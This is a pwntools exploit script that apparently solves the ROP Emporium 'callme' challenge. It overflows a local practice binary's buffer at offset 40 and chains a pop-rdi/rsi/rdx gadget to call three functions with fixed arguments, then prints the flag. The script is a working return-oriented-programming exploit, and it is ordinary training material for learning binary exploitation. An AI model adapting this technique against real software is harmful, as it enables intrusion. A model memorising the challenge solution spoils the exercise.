from pwn import *
import warnings

# Binary filename
exe = './callme'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'info'
warnings.filterwarnings('ignore')

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Start program
io = process()

# EIP/RIP offset
offset = 40

onegadget = 0x000000000040093c # pop rdi; pop rsi; pop rdx; ret; 

arg1 = 0xdeadbeefdeadbeef
arg2 = 0xcafebabecafebabe
arg3 = 0xd00df00dd00df00d 

callme_one = 0x0000000000400720
callme_two = 0x0000000000400740
callme_three = 0x00000000004006f0


# Build the payload
payload = flat([
    "A" * offset,
    onegadget,
    arg1,
    arg2,
    arg3,
    callme_one,
    onegadget,
    arg1,
    arg2,
    arg3,
    callme_two,
    onegadget,
    arg1,
    arg2,
    arg3,
    callme_three
])

# Send the payload
io.sendlineafter(b'>', payload)
io.recvuntil('Thank you!\n')

io.recvline()
io.recvline()

flag = io.recv()
success(flag)
